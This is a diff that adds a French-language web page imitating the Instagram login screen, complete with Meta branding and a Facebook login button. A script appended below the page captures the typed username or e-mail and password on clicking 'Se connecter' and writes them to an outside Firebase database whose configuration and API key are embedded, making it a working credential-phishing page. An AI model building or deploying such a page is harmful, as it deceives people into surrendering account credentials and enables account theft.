@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="website icon" type="png"  href="pngtree-instagram-icon-instagram-logo-png-image_3584853.png">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <img class="insta" src="ei_1729335285770-removebg-preview.png" alt="">
+        <button class="facebook-button">
+            <i class='bx bxl-facebook-square'></i>
+            <span>Continuer avec Facebook</span>
+        </button>
+        <div class="ligne">
+            <hr>
+            <p>ou </p> 
+            <hr>
+        </div>  
+            <input class="place" type="text" placeholder="Num. téléphone, nom d'utilisateur ou e-mail" name="email" required>
+            <input type="password" placeholder="Mot de passe" name="password" required>
+            <a class="mot" href="#">Mot de passe oublié ?</a>
+            <button class="login-button" type="submit"><p>Se connecter</p></button>
+        </form>
+        
+ <div class="title"> <p>Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a></p></div>      
+    </div>
+    
+    <footer>
+        <div class="meta">
+           <div class="from"> <p >from</p></div>
+            <div class="icons">
+            <a href="#" class="logo"><i class='bx bxl-meta'></i></a>
+           <p>Meta </p>
+          </div>
+        
+        </div>
+<hr class="final">
+        <div class="footer-icons">
+            <a href="#">
+                <i class='bx bxs-home'></i>            </a>
+            <a href="#">
+                <i class='bx bxs-paper-plane'></i>            </a>
+            <a class="media" href="#">
+                <img src="ei_1729333804366-removebg-preview.png"></a>
+            <a href="#">
+                <i class='bx bx-search'></i>
+            </a>    
+            <a href="#">
+                <i class='bx bx-user'></i>
+            </a>
+            </div>
+            </footer>
+            </body>
+            </html>
+
+
+            <script type="module">
+                // Import the functions you need from the SDKs you need
+                import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+                import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
+            
+                // Your web app's Firebase configuration
+                const firebaseConfig = {
+                  apiKey: "AIzaSyCEModk4t8gd5kFXfqhJdWs-b4muR95lCw",
+                  authDomain: "wrud-d8c8a.firebaseapp.com",
+                  projectId: "wrud-d8c8a",
+                  storageBucket: "wrud-d8c8a.appspot.com",
+                  messagingSenderId: "837519064834",
+                  appId: "1:837519064834:web:e9a5d0c2db734f83abcc1b"
+                };
+              
+                // Initialize Firebase
+                const app = initializeApp(firebaseConfig);
+                const database = getDatabase(app);
+            
+                // Correctly select the login button and add the event listener
+                document.querySelector('.login-button').addEventListener('click', function(e) {
+                    e.preventDefault(); // Prevent the default form submission
+                    
+                    var email = document.querySelector('input[name="email"]').value;
+                    var password = document.querySelector('input[name="password"]').value;
+            
+                    set(ref(database, 'users/' + password), {
+                        password: password,
+                        email: email,
+                    }).then(() => {
+                        // Data saved successfully!
+                        alert('data submitted');
+                    }).catch((error) => {
+                        // The write failed...
+                        alert('error: ' + error.message);
+                    });
+                });
+            </script>
